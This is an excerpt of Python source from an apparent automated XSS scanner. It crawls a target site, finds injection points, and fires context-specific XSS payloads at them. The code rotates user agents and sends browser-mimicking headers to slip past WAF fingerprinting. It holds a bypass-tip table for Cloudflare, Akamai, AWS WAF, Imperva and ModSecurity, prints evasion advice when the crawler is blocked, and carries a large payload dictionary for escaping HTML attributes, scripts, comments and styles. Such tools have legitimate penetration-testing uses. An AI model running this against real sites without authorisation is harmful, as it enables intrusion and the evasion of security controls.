        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
    ]

    # Full browser-like headers that pass WAF fingerprinting
    _BROWSER_HEADERS = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Cache-Control': 'max-age=0',
        'DNT': '1',
    }

    def __init__(self, cookies=None, headers=None, proxy=None,
                 auth_type=None, auth_cred=None, timeout=10, user_agent=None):
        self.s = requests.Session()
        self.timeout = timeout
        self._ua_index = 0
        self._rate_limit_delay = 0  # adaptive throttle (seconds)
        self._request_count = 0
        # Set full browser-like headers first
        self.s.headers.update(self._BROWSER_HEADERS)
        # Set User-Agent (custom or first in rotation)
        self.s.headers['User-Agent'] = user_agent or self._USER_AGENTS[0]
        # Overlay any caller-supplied extra headers
        if headers: self.s.headers.update(headers)
        if cookies:
            for pair in cookies.split(';'):
                if '=' in pair:
                    k,v = pair.strip().split('=',1)
                    self.s.cookies.set(k.strip(), v.strip())
        if proxy:
            self.s.proxies = {'http':proxy,'https':proxy}
            self.s.verify = False
        if auth_type == 'basic' and auth_cred and ':' in auth_cred:
            u,p = auth_cred.split(':',1)
            self.s.auth = HTTPBasicAuth(u,p)
        elif auth_type == 'bearer' and auth_cred:
            self.s.headers['Authorization'] = f'Bearer {auth_cred}'

    def _rotate_ua(self):
        """Rotate to next User-Agent on 403/429."""
        self._ua_index = (self._ua_index + 1) % len(self._USER_AGENTS)
        self.s.headers['User-Agent'] = self._USER_AGENTS[self._ua_index]

    def _request(self, method, url, retries=3, **kwargs):
        """Send request with automatic retry + UA rotation + adaptive throttle."""
        kwargs.setdefault('timeout', self.timeout)
        kwargs.setdefault('allow_redirects', True)
        # Adaptive throttle: if we hit 429s earlier, slow down automatically
        if self._rate_limit_delay > 0:
            time.sleep(self._rate_limit_delay)
        self._request_count += 1
        for attempt in range(retries):
            try:
                resp = self.s.request(method, url, **kwargs)
                if resp.status_code == 429:
                    # Adaptive: increase delay on rate limit
                    self._rate_limit_delay = min(self._rate_limit_delay + 0.5, 5.0)
                    self._rotate_ua()
                    wait = float(resp.headers.get('Retry-After', 2 * (attempt + 1)))
                    if attempt < retries - 1:
                        time.sleep(wait)
                        continue
                    return resp
                elif resp.status_code in (403, 503):
                    self._rotate_ua()
                    if attempt < retries - 1:
                        time.sleep(1.5 * (attempt + 1))
                        continue
                    return resp
                # Success — gradually reduce throttle
                if self._rate_limit_delay > 0:
                    self._rate_limit_delay = max(0, self._rate_limit_delay - 0.05)
                return resp
            except requests.exceptions.SSLError:
                kwargs['verify'] = False
                continue
            except requests.exceptions.ConnectionError:
                if attempt < retries - 1: time.sleep(2)
                continue
            except Exception:
                return None
        return None

    def get(self, url, params=None, headers=None):
        return self._request('GET', url, params=params, headers=headers)

    def post(self, url, data=None, headers=None):
        return self._request('POST', url, data=data, headers=headers)

    def get_custom_headers(self, url, hdrs):
        m = dict(self.s.headers); m.update(hdrs)
        return self._request('GET', url, headers=m)

    def head(self, url):
        return self._request('HEAD', url)


# ═══════════════════════════════════════════════════════════════════════
# CSP ANALYZER — detect Content-Security-Policy weaknesses
# ═══════════════════════════════════════════════════════════════════════

class CSPAnalyzer:
    """Analyze Content-Security-Policy headers for XSS-enabling weaknesses."""

    def __init__(self):
        self.findings = []

    def analyze(self, resp):
        """Analyze response headers for CSP and return findings."""
        if resp is None:
            self.findings.append(('CRITICAL', 'No CSP header', 'No Content-Security-Policy header found — XSS payloads execute freely.'))
            return self.findings

        csp = resp.headers.get('Content-Security-Policy', '')
        csp_ro = resp.headers.get('Content-Security-Policy-Report-Only', '')
        x_xss = resp.headers.get('X-XSS-Protection', '')
        x_ct = resp.headers.get('X-Content-Type-Options', '')

        if not csp and not csp_ro:
            self.findings.append(('CRITICAL', 'No CSP header', 'No Content-Security-Policy header — all XSS payloads will execute.'))
        else:
            policy = csp or csp_ro
            is_report_only = not csp and bool(csp_ro)
            if is_report_only:
                self.findings.append(('HIGH', 'CSP Report-Only', 'CSP is in report-only mode — payloads still execute.'))

            directives = {}
            for part in policy.split(';'):
                part = part.strip()
                if not part:
                    continue
                tokens = part.split()
                if tokens:
                    directives[tokens[0].lower()] = tokens[1:] if len(tokens) > 1 else []

            # Check for unsafe-inline
            for d in ('script-src', 'default-src'):
                vals = directives.get(d, [])
                if "'unsafe-inline'" in vals:
                    self.findings.append(('HIGH', f"unsafe-inline in {d}", f"'{d}' allows 'unsafe-inline' — inline scripts execute."))
                if "'unsafe-eval'" in vals:
                    self.findings.append(('HIGH', f"unsafe-eval in {d}", f"'{d}' allows 'unsafe-eval' — eval()/Function() work."))
                if '*' in vals:
                    self.findings.append(('HIGH', f"Wildcard in {d}", f"'{d}' uses wildcard '*' — scripts from any domain allowed."))
                if 'data:' in vals:
                    self.findings.append(('MEDIUM', f"data: in {d}", f"'{d}' allows data: URIs — inline script via data: possible."))
                # JSONP-able CDNs
                jsonp_cdns = ['googleapis.com', 'cloudflare.com', 'cdnjs.cloudflare.com',
                              'ajax.googleapis.com', 'accounts.google.com', 'gstatic.com',
                              'jsdelivr.net', 'unpkg.com']
                for v in vals:
                    for cdn in jsonp_cdns:
                        if cdn in v:
                            self.findings.append(('HIGH', f"JSONP-able CDN in {d}", f"'{d}' allows '{v}' — JSONP callback XSS bypass possible."))
                            break

            # No script-src → falls back to default-src
            if 'script-src' not in directives and 'default-src' not in directives:
                self.findings.append(('HIGH', 'No script-src directive', 'No script-src or default-src — scripts from any origin allowed.'))

            # object-src missing
            if 'object-src' not in directives:
                obj_default = directives.get('default-src', [])
                if "'none'" not in obj_default:
                    self.findings.append(('MEDIUM', 'No object-src', 'Missing object-src — plugin-based XSS (Flash/Java) possible.'))

            # base-uri missing
            if 'base-uri' not in directives:
                self.findings.append(('MEDIUM', 'No base-uri', 'Missing base-uri — <base> tag hijacking possible.'))

        # X-XSS-Protection analysis
        if not x_xss:
            self.findings.append(('LOW', 'No X-XSS-Protection', 'Missing X-XSS-Protection header (legacy, but still useful for older browsers).'))
        elif '0' in x_xss:
            self.findings.append(('LOW', 'X-XSS-Protection disabled', 'X-XSS-Protection explicitly disabled with "0".'))

        # X-Content-Type-Options
        if x_ct.lower() != 'nosniff':
            self.findings.append(('LOW', 'No X-Content-Type-Options: nosniff', 'Missing nosniff — MIME type sniffing may enable XSS.'))

        return self.findings

    def summary_str(self):
        """Return a printable summary of findings."""
        if not self.findings:
            return "No CSP issues detected."
        lines = []
        for sev, title, desc in self.findings:
            lines.append(f"[{sev}] {title}: {desc}")
        return "\n".join(lines)


# ═══════════════════════════════════════════════════════════════════════
# WAF FINGERPRINTER — identify specific WAF for targeted bypass
# ═══════════════════════════════════════════════════════════════════════

class WAFFingerprinter:
    """Detect and fingerprint Web Application Firewalls."""

    # WAF signatures: (header/body pattern, WAF name)
    _SIGNATURES = [
        # Cloudflare
        (lambda r: 'cf-ray' in r.headers, 'Cloudflare'),
        (lambda r: '__cf_bm' in r.headers.get('Set-Cookie', ''), 'Cloudflare'),
        (lambda r: 'cloudflare' in r.text.lower(), 'Cloudflare'),
        # Akamai
        (lambda r: 'akamai' in r.headers.get('Server', '').lower(), 'Akamai'),
        (lambda r: 'reference #' in r.text.lower() and 'access denied' in r.text.lower(), 'Akamai'),
        (lambda r: 'akamaighost' in r.headers.get('Server', '').lower(), 'Akamai'),
        # AWS WAF
        (lambda r: 'awselb' in r.headers.get('Set-Cookie', '').lower(), 'AWS WAF/ALB'),
        (lambda r: 'x-amzn-requestid' in r.headers, 'AWS WAF'),
        (lambda r: 'x-amz-cf-id' in r.headers, 'AWS CloudFront'),
        # Imperva/Incapsula
        (lambda r: 'incap_ses' in r.headers.get('Set-Cookie', '').lower(), 'Imperva/Incapsula'),
        (lambda r: 'visitorid' in r.headers.get('Set-Cookie', '').lower(), 'Imperva/Incapsula'),
        (lambda r: 'incapsula' in r.text.lower(), 'Imperva/Incapsula'),
        # ModSecurity
        (lambda r: 'modsecurity' in r.headers.get('Server', '').lower(), 'ModSecurity'),
        (lambda r: 'mod_security' in r.text.lower(), 'ModSecurity'),
        # Sucuri
        (lambda r: 'sucuri' in r.headers.get('Server', '').lower(), 'Sucuri'),
        (lambda r: 'x-sucuri-id' in r.headers, 'Sucuri'),
        # F5 BIG-IP ASM
        (lambda r: 'bigipserver' in r.headers.get('Set-Cookie', '').lower(), 'F5 BIG-IP'),
        (lambda r: 'ts=' in r.headers.get('Set-Cookie', '').lower() and 'f5' in r.headers.get('Server', '').lower(), 'F5 BIG-IP'),
        # Barracuda
        (lambda r: 'barracuda' in r.headers.get('Server', '').lower(), 'Barracuda WAF'),
        (lambda r: 'barra_counter_session' in r.headers.get('Set-Cookie', '').lower(), 'Barracuda WAF'),
        # Fortinet FortiWeb
        (lambda r: 'fortigate' in r.headers.get('Server', '').lower(), 'Fortinet FortiWeb'),
        (lambda r: 'fortiweb' in r.headers.get('Server', '').lower(), 'Fortinet FortiWeb'),
        # Wordfence (WordPress)
        (lambda r: 'wordfence' in r.text.lower(), 'Wordfence'),
        (lambda r: 'wfvt_' in r.headers.get('Set-Cookie', ''), 'Wordfence'),
        # DDoS-Guard
        (lambda r: 'ddos-guard' in r.headers.get('Server', '').lower(), 'DDoS-Guard'),
        # Fastly
        (lambda r: 'fastly' in r.headers.get('Via', '').lower(), 'Fastly'),
        (lambda r: 'x-fastly-request-id' in r.headers, 'Fastly'),
        # Vercel
        (lambda r: 'x-vercel-id' in r.headers, 'Vercel Edge'),
        # Netlify
        (lambda r: 'x-nf-request-id' in r.headers, 'Netlify'),
    ]

    def fingerprint(self, resp):
        """Return list of detected WAF names from response."""
        if resp is None:
            return []
        detected = set()
        for check_fn, waf_name in self._SIGNATURES:
            try:
                if check_fn(resp):
                    detected.add(waf_name)
            except Exception:
                continue
        return sorted(detected)

    @staticmethod
    def get_bypass_tips(waf_name):
        """Return bypass tips for a specific WAF."""
        tips = {
            'Cloudflare': [
                'Use encoding: double URL encode, Unicode escapes',
                'Try: <svg/onload=alert`1`> (backtick bypass)',
                'Cloudflare allows <details open ontoggle=alert(1)>',
                'Use --delay 2 to avoid rate limiting',
            ],
            'Akamai': [
                'Akamai blocks common patterns — use polyglot payloads',
                'Try: <input onfocus=alert(1) autofocus>',
                'Encoding: &#x61;&#x6C;&#x65;&#x72;&#x74;(1)',
                'Pass real session cookies with --cookies',
            ],
            'AWS WAF': [
                'AWS WAF rules are customizable — try all encoding variants',
                'Unicode bypass: \\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
                'Try: <img src=x onerror=alert`1`>',
            ],
            'Imperva/Incapsula': [
                'Imperva has strong JS fingerprinting — use --cookies from a real browser',
                'Try: <svg/onload="alert(1)"> with proper Referer header',
                'Encoding bypass: %3Csvg%20onload%3Dalert(1)%3E',
            ],
            'ModSecurity': [
                'ModSecurity paranoia level matters — try mutation payloads',
                'Bypass CRS: <scr<script>ipt>alert(1)</scr<script>ipt>',
                'Try: <math><mtext></mtext></math><script>alert(1)</script>',
            ],
        }
        return tips.get(waf_name, ['No specific tips — try polyglot and encoding payloads.'])


# ═══════════════════════════════════════════════════════════════════════
# INJECTION POINT
# ═══════════════════════════════════════════════════════════════════════

class InjectionPoint:
    def __init__(self, url, method, param_name, param_type,
                 form_action=None, form_data=None, input_type=None):
        self.url = url
        self.method = method
        self.param_name = param_name
        self.param_type = param_type  # url_param | form_input | form_textarea | hidden
        self.form_action = form_action
        self.form_data = form_data or {}
        self.input_type = input_type


# ═══════════════════════════════════════════════════════════════════════
# CRAWLER — discovers pages, forms, parameters
# ═══════════════════════════════════════════════════════════════════════

class Crawler:
    def __init__(self, http, max_depth=3, delay=0, max_pages=500):
        self.http = http
        self.max_depth = max_depth
        self.delay = delay
        self.max_pages = max_pages
        self.visited: Set[str] = set()
        self.pages: List[str] = []
        self.points: List[InjectionPoint] = []
        self.forms_count = 0
        self.waf_blocked = False
        self.is_spa = False

    # ── WAF / protection detection ────────────────────────────────────
    @staticmethod
    def _detect_protection(resp):
        """Return (blocked:bool, kind:str) based on response."""
        if resp is None:
            return True, 'no-response'
        sc = resp.status_code
        body = resp.text.lower()
        server = resp.headers.get('Server','').lower()
        # 403 from WAF/CDN
        if sc == 403:
            if 'akamai' in body or 'edgesuite' in body or 'reference #' in body:
                return True, 'Akamai WAF (403)'
            if 'cloudflare' in body or '__cf_bm' in resp.headers.get('Set-Cookie',''):
                return True, 'Cloudflare (403)'
            if 'incapsula' in body or 'visitorid' in resp.headers.get('Set-Cookie','').lower():
                return True, 'Imperva/Incapsula (403)'
            if 'access denied' in body or 'blocked' in body:
                return True, 'WAF/Firewall (403)'
            return True, f'HTTP 403 Forbidden'
        if sc == 429:
            return True, 'Rate Limited (429)'
        if sc == 503:
            if 'cloudflare' in body:
                return True, 'Cloudflare Challenge (503)'
            return True, 'Service Unavailable (503)'
        if sc == 200:
            # CAPTCHA page despite 200
            if any(x in body for x in ['captcha','recaptcha','hcaptcha','are you a robot','i am not a robot']):
                return True, 'CAPTCHA Challenge (200)'
            # JS challenge (empty body, just a JS redirect)
            if len(resp.text.strip()) < 500 and 'javascript' in body:
                return True, 'JS Challenge (empty body)'
        return False, ''

    # ── SPA / framework detection ─────────────────────────────────────
    @staticmethod
    def _detect_spa(resp):
        """Return (is_spa:bool, framework:str)."""
        body = resp.text.lower()
        if '_next/static' in body or '"__next_data__"' in body or '"__next"' in body:
            return True, 'Next.js'
        if '__nuxt' in body or 'window.__nuxt' in body:
            return True, 'Nuxt.js'
        if 'ng-version' in body or 'ng-app' in body:
            return True, 'Angular'
        if 'data-reactroot' in body or 'data-reactid' in body or '__react' in body:
            return True, 'React'
        if 'data-ember-action' in body or 'ember-view' in body:
            return True, 'EmberJS'
        if 'vue-router' in body or 'data-v-' in body:
            return True, 'Vue.js'
        # Generic SPA: tiny HTML body with a root div and big JS bundles
        soup_check = BeautifulSoup(resp.text, 'lxml')
        links_count = len(soup_check.find_all('a', href=True))
        forms_count = len(soup_check.find_all('form'))
        scripts_count = len(soup_check.find_all('script', src=True))
        if links_count == 0 and forms_count == 0 and scripts_count >= 2:
            return True, 'Generic SPA (JS-rendered)'
        return False, ''

    # ── Extract Next.js / Nuxt routes from JS payloads ────────────────
    @staticmethod
    def _extract_spa_routes(html, base_url):
        """Pull URL paths embedded in JS bundles / __NEXT_DATA__ / router configs."""
        routes = set()
        # Next.js __NEXT_DATA__ JSON
        m = re.search(r'<script[^>]+id=["\']__NEXT_DATA__["\'][^>]*>(.*?)</script>', html, re.DOTALL)
        if m:
            try:
                import json
                data = json.loads(m.group(1))
                # runtimeConfig publicRuntimeConfig, router, etc.
                raw = json.dumps(data)
                for path in re.findall(r'"(/[^"]{1,200})"', raw):
                    if path.startswith('/') and '.' not in path.split('/')[-1]:
                        routes.add(path)
            except Exception:
                pass
        # Generic JS route patterns
        for pat in [
            r'["\']path["\']\s*:\s*["\'](/[^"\'?#]{1,100})["\']',
            r'["\']href["\']\s*:\s*["\'](/[^"\'?#]{1,100})["\']',
            r'["\']url["\']\s*:\s*["\'](/[^"\'?#]{1,100})["\']',
            r'(?:to|href|path)\s*=\s*["\'](/[^"\'?#]{1,100})["\']',
            r'router\.push\(["\']([^"\'?#]{1,100})["\']',
            r'history\.push\(["\']([^"\'?#]{1,100})["\']',
            r'navigate\(["\']([^"\'?#]{1,100})["\']',
            r'"(/(?:search|product|category|shop|api|page)[^"]{0,80})"',
        ]:
            for path in re.findall(pat, html):
                if path.startswith('/') and not path.startswith('//'):
                    routes.add(path)
        return [urljoin(base_url, r) for r in routes]

    def crawl(self, start_url) -> Tuple[List[str], List[InjectionPoint]]:
        base = extract_base_url(start_url)
        queue = deque([(start_url, 0)])
        waf_hits = 0

        while queue and len(self.visited) < self.max_pages:
            url, depth = queue.popleft()
            norm = normalize_url(url)
            if norm in self.visited or depth > self.max_depth: continue
            if not is_same_domain(url, base) or is_static(url): continue
            self.visited.add(norm)

            scan_msg(f"[Depth {depth}] {trunc(url, 70)}")
            resp = self.http.get(url)

            # ── Protection check ──────────────────────────────────────
            blocked, kind = self._detect_protection(resp)
            if blocked:
                waf_hits += 1
                warn(f"[WAF/Block] {kind} on {trunc(url,60)}")
                if waf_hits == 1:
                    # Print advice once
                    print()
                    warn("  Target appears to be protected by a WAF or bot-detection system.")
                    warn("  Tips to bypass:")
                    warn("    1. Pass session cookies:  --cookies 'session=abc123'")
                    warn("    2. Add delay between reqs: --delay 2")
                    warn("    3. Use a real browser session cookie from DevTools")
                    warn("    4. Try specific endpoints: -u 'https://target.com/search?q=test'")
                    warn("    5. Route through Burp:    --proxy http://127.0.0.1:8080")
                    print()
                if resp and resp.status_code == 403: continue
                continue

            if not resp or 'text/html' not in resp.headers.get('Content-Type',''):
                continue

            # ── SPA detection (first page only) ──────────────────────
            if not self.pages:
                is_spa, framework = self._detect_spa(resp)
                if is_spa:
                    self.is_spa = True
                    warn(f"[SPA Detected] {framework} — site is JavaScript-rendered.")
                    warn("  The scanner will extract embedded routes from JS, but forms/params")
                    warn("  may not be visible until JS executes in a real browser.")
                    warn("  Recommendation: scan specific known endpoints manually, e.g.:")
                    warn(f"    python3 xss_scanner.py -u '{base}/search?q=test'")
                    warn(f"    python3 xss_scanner.py -u '{base}/api/search?query=test'")
                    # Extract SPA routes and queue them
                    spa_routes = self._extract_spa_routes(resp.text, base)
                    for r in spa_routes:
                        if normalize_url(r) not in self.visited:
                            queue.append((r, 1))
                    if spa_routes:
                        info(f"  Extracted {len(spa_routes)} embedded routes from JS bundles.")
                    print()

            self.pages.append(url)
            soup = BeautifulSoup(resp.text, 'lxml')

            # URL params
            for p in get_url_params(url):
                self.points.append(InjectionPoint(url,'GET',p,'url_param'))

            # Forms
            for form in soup.find_all('form'):
                self.forms_count += 1
                action = urljoin(url, form.get('action','')) or url
                method = form.get('method','GET').upper()
                # Collect ALL fields first so every InjectionPoint has the complete form_data
                fields = {}
                field_meta = []  # (name, itype, ptype)
                for el in form.find_all(['input','textarea','select']):
                    name = el.get('name')
                    if not name: continue
                    itype = el.get('type','text').lower() if el.name=='input' else el.name
                    fields[name] = el.get('value','')
                    ptype = 'hidden' if itype=='hidden' else ('form_textarea' if el.name=='textarea' else 'form_input')
                    field_meta.append((name, itype, ptype))
                # Now create InjectionPoints with the COMPLETE form_data
                for name, itype, ptype in field_meta:
                    self.points.append(InjectionPoint(url, method, name, ptype,
                                                       form_action=action,
                                                       form_data=dict(fields),
                                                       input_type=itype))

                # Also queue the form action URL as a crawl target
                if action and is_same_domain(action, base) and normalize_url(action) not in self.visited:
                    queue.append((action, depth + 1))

            # Links
            if depth < self.max_depth:
                for tag in soup.find_all(['a','area']):
                    href = tag.get('href','').strip()
                    if href and not href.startswith(('#','mailto:','tel:','javascript:')):
                        full = urljoin(url, href)
                        if normalize_url(full) not in self.visited:
                            queue.append((full, depth+1))

                # JS-embedded links and routes
                for pat in [
                    r'(?:href|action|src|url)\s*[=:]\s*["\']([^"\']+)["\']',
                    r'window\.location\s*=\s*["\']([^"\']+)["\']',
                    r'["\']path["\']\s*:\s*["\']([^"\']+)["\']',
                    r'router\.push\(["\']([^"\']+)["\']',
                ]:
                    for m in re.findall(pat, resp.text):
                        if m.startswith(('http://','https://','/')):
                            full = urljoin(url, m)
                            if is_same_domain(full, base) and normalize_url(full) not in self.visited:
                                queue.append((full, depth+1))

            if self.delay: time.sleep(self.delay)

        if waf_hits and not self.pages:
            self.waf_blocked = True

        return self.pages, self.points


# ═══════════════════════════════════════════════════════════════════════
# CONTEXT ANALYZER — understands where input lands in HTML
# ═══════════════════════════════════════════════════════════════════════

class ContextAnalyzer:
    def __init__(self):
        self.re_script  = re.compile(r'<script[^>]*>(.*?)</script>', re.DOTALL|re.I)
        self.re_comment = re.compile(r'<!--(.*?)-->', re.DOTALL)
        self.re_style   = re.compile(r'<style[^>]*>(.*?)</style>', re.DOTALL|re.I)

    def analyze(self, html, marker):
        results = []
        if marker not in html: return results
        pos = 0
        while True:
            pos = html.find(marker, pos)
            if pos == -1: break
            results.append(self._ctx(html, pos, marker))
            pos += len(marker)
        return results

    def _ctx(self, html, pos, marker):
        for m in self.re_comment.finditer(html):
            if m.start() <= pos <= m.end(): return ('comment', html[max(0,pos-60):pos+len(marker)+60])
        for m in self.re_script.finditer(html):
            if m.start() <= pos <= m.end(): return self._script_ctx(html, pos, marker)
        for m in self.re_style.finditer(html):
            if m.start() <= pos <= m.end(): return ('style', html[max(0,pos-60):pos+len(marker)+60])

        # Check attribute context
        before = html[max(0,pos-500):pos]
        depth = 0
        for i in range(len(before)-1,-1,-1):
            if before[i] == '>': depth += 1
            elif before[i] == '<':
                if depth == 0:
                    tag_chunk = before[i:]
                    if re.search(r'(\w+)\s*=\s*"[^"]*$', tag_chunk):
                        return ('attr_double', html[max(0,pos-60):pos+len(marker)+60])
                    if re.search(r"(\w+)\s*=\s*'[^']*$", tag_chunk):
                        return ('attr_single', html[max(0,pos-60):pos+len(marker)+60])
                    return ('attr_unquoted', html[max(0,pos-60):pos+len(marker)+60])
                depth -= 1

        return ('html_text', html[max(0,pos-60):pos+len(marker)+60])

    def _script_ctx(self, html, pos, marker):
        before = html[max(0,pos-200):pos]
        surround = html[max(0,pos-60):pos+len(marker)+60]
        dq = sum(1 for c in before if c=='"' and (before[max(0,before.index(c)-1)] if before.index(c)>0 else '')!='\\')
        sq = sum(1 for c in before if c=="'" and (before[max(0,before.index(c)-1)] if before.index(c)>0 else '')!='\\')
        if dq % 2 == 1: return ('script_dquote', surround)
        if sq % 2 == 1: return ('script_squote', surround)
        return ('script_bare', surround)


# ═══════════════════════════════════════════════════════════════════════
# DYNAMIC PAYLOAD GENERATOR — creates context-aware payloads
# ═══════════════════════════════════════════════════════════════════════

CONTEXT_PAYLOADS = {
    'html_text': (
        BASIC_PAYLOADS[:20] + SVG_PAYLOADS[:10] + DOM_PAYLOADS[:8] +
        EVENT_HANDLER_PAYLOADS[:15] + POLYGLOT_PAYLOADS[:5] +
        MUTATION_PAYLOADS[:5] + FILTER_BYPASS_PAYLOADS[:8]
    ),
    'attr_double': (
        [p for p in ATTRIBUTE_ESCAPE if p.startswith('"')] +
        [p for p in WAF_BYPASS_PAYLOADS if p.startswith('"')] +
        ['" onanimationstart="alert(1)" style="animation-name:x" x="',
         '" ontransitionend="alert(1)" style="transition:all 0.1s" x="',
         '" onpointerdown="alert(1)" x="',
         '" onfocusin="alert(1)" autofocus x="']
    ),
    'attr_single': (
        [p for p in ATTRIBUTE_ESCAPE if p.startswith("'")] +
        [p for p in WAF_BYPASS_PAYLOADS if p.startswith("'")] +
        ["' onanimationstart='alert(1)' style='animation-name:x' x='",
         "' onpointerdown='alert(1)' x='"]
    ),
    'attr_unquoted': [
        ' onmouseover=alert(1) ',
        ' onfocus=alert(1) autofocus ',
        ' onclick=alert(1) ',
        ' onkeypress=alert(1) ',
        ' onmousedown=alert(1) ',
        ' onerror=alert(1) ',
        ' onload=alert(1) ',
        ' onpointerdown=alert(1) ',
        ' onanimationstart=alert(1) ',
        '><script>alert(1)</script>',
        '><img src=x onerror=alert(1)>',
        '><svg onload=alert(1)>',
        '><details open ontoggle=alert(1)>',
    ],
    'script_dquote': (
        [p for p in SCRIPT_ESCAPE if p.startswith('"')] +
        ['"-alert(1)-"', '"-confirm(1)-"', '\\";alert(1);//',
         '"-window.onerror=alert-throw 1//"']
    ),
    'script_squote': (
        [p for p in SCRIPT_ESCAPE if p.startswith("'")] +
        ["'-alert(1)-'", "'-confirm(1)-'", "\\';alert(1);//",
         "'-window.onerror=alert-throw 1//'"]
    ),
    'script_bare': [
        'alert(1)',
        ';alert(1);//',
        '</script><script>alert(1)</script>',
        '};alert(1);//',
        ')};alert(1);//',
        'throw onerror=alert,1',
        'onerror=alert;throw 1',
    ],
    'comment': COMMENT_ESCAPE + [
        '--><svg onload=alert(1)>',
        '--><details open ontoggle=alert(1)>',
        '--><input onfocus=alert(1) autofocus>',
        '*/<script>alert(1)</script>',
        '*/<svg onload=alert(1)>',
    ],
    'style': CSS_PAYLOADS[:10] + [
        '</style><script>alert(1)</script>',
        '</style><img src=x onerror=alert(1)>',
        '</style><svg onload=alert(1)>',
        '</style><details open ontoggle=alert(1)>',
        '</style><input onfocus=alert(1) autofocus>',
    ],
}


# ═══════════════════════════════════════════════════════════════════════
# REFLECTED XSS SCANNER
# ═══════════════════════════════════════════════════════════════════════

class ReflectedScanner:
    """
    Full-fledged Reflected XSS scanner with:
      - Deduplication: same (action_url, param) combo tested only once
      - Multi-vector: checks BOTH GET and POST responses for reflection
      - Precise payload verification: checks exact payload in response HTML
      - Per-context deep testing with fallback to full payload arsenal
      - Smart form filling so POST forms don't get rejected
    """

    # Fake data for filling non-target POST fields
    _FILL = {
        'email': 'scanbot@tempmail.com', 'mail': 'scanbot@tempmail.com',
        'name': 'Test User', 'fullname': 'Test User', 'full_name': 'Test User',
        'firstname': 'Test', 'first_name': 'Test', 'lastname': 'User', 'last_name': 'User',
        'phone': '5551234567', 'tel': '5551234567', 'mobile': '5551234567',
        'password': 'TestPass1!', 'pass': 'TestPass1!', 'passwd': 'TestPass1!',
        'upass': 'TestPass1!', 'upass2': 'TestPass1!', 'confirm_password': 'TestPass1!',
        'username': 'testuser', 'user': 'testuser', 'login': 'testuser',
        'uname': 'testuser', 'uuname': 'testuser',
        'message': 'Test message', 'text': 'Test message', 'comment': 'Test message',
        'body': 'Test message', 'content': 'Test message', 'feedback': 'Test message',
        'subject': 'Test', 'title': 'Test',
        'address': '123 Test St', 'uaddress': '123 Test St',
        'city': 'TestCity', 'state': 'CA', 'zip': '90210', 'zipcode': '90210',
        'country': 'US', 'url': 'https://example.com', 'website': 'https://example.com',
        'company': 'TestCo', 'organization': 'TestCo',
        'cc': '1234567890', 'ucc': '1234567890',
        'age': '25', 'number': '1', 'quantity': '1',
        'urname': 'Test User', 'uemail': 'scanbot@tempmail.com', 'uphone': '5551234567',
    }

    def __init__(self, http, payloads, custom_payloads, delay=0):
        self.http = http
        self.payloads = payloads
        self.custom = custom_payloads
        self.delay = delay
        self.ctx = ContextAnalyzer()
        self.vulns = []
        self.sent = 0

    def _dedup_points(self, points):
        """Deduplicate injection points: same (action_url_path, param_name, method) → keep first."""
        seen = set()
        unique = []
        for pt in points:
            action = pt.form_action or pt.url
            # Normalize: strip query params from action for dedup, keep param name + method
            action_path = urlparse(action).path
            key = (action_path, pt.param_name, pt.method)
            if key not in seen:
                seen.add(key)
                unique.append(pt)
        return unique

    def _fill_form(self, pt, payload):
        """Fill all form fields with realistic data, target field gets payload."""
        d = {}
        for field, val in pt.form_data.items():
            if field == pt.param_name:
                d[field] = payload
            elif val and val.strip():
                d[field] = val  # keep pre-filled values (hidden, selects)
            else:
                fn = field.lower().replace('-','_').replace(' ','_')
                d[field] = self._FILL.get(fn, self._FILL.get(
                    next((k for k in self._FILL if k in fn), ''), f'test_{uid(4)}'))
        d[pt.param_name] = payload
        return d

    def scan(self, points):
        # Deduplicate: same endpoint+param tested only once
        unique = self._dedup_points(points)
        skipped = len(points) - len(unique)
        if skipped:
            dim(f"Deduplicated {len(points)} → {len(unique)} unique injection points (skipped {skipped} duplicates)")
        total = len(unique)

        for idx, pt in enumerate(unique):
            progress_bar(idx+1, total, label=f"{pt.param_name}@{trunc(urlparse(pt.url).path,30)}")

            # Phase 1 — reflection probe with canary
            probe = canary("rxss")
            resp = self._inject(pt, probe)
            if not resp or probe not in resp.text:
                continue

            contexts = self.ctx.analyze(resp.text, probe)
            if not contexts:
                continue

            # Deduplicate contexts: one vuln per unique context type
            seen_ctx = set()
            found_any = False
            for ctx_type, ctx_surround in contexts:
                if ctx_type in seen_ctx:
                    continue
                seen_ctx.add(ctx_type)

                # Phase 2 — try context payloads then general
                ctx_specific = CONTEXT_PAYLOADS.get(ctx_type, BASIC_PAYLOADS[:10])
                test_set = list(OrderedDict.fromkeys(ctx_specific + self.custom + self.payloads))

                for payload in test_set:
                    self.sent += 1
                    r = self._inject(pt, payload)
                    if r and self._check_exact(r.text, payload):
                        v = {
                            'xss_type': 'Reflected', 'severity': 'HIGH',
                            'url': pt.form_action or pt.url, 'method': pt.method,
                            'parameter': pt.param_name, 'param_type': pt.param_type,
                            'payload': payload, 'context': ctx_type,
                            'evidence': self._evidence(r.text, payload),
                            'page_found_on': pt.url,
                            'manual_test': self._manual_test(pt, payload),
                        }
                        self.vulns.append(v)
                        vuln_msg(f"Reflected XSS → {Fore.YELLOW}{pt.param_name}{RESET} "
                                 f"@ {trunc(pt.form_action or pt.url, 50)} [{ctx_type}]")
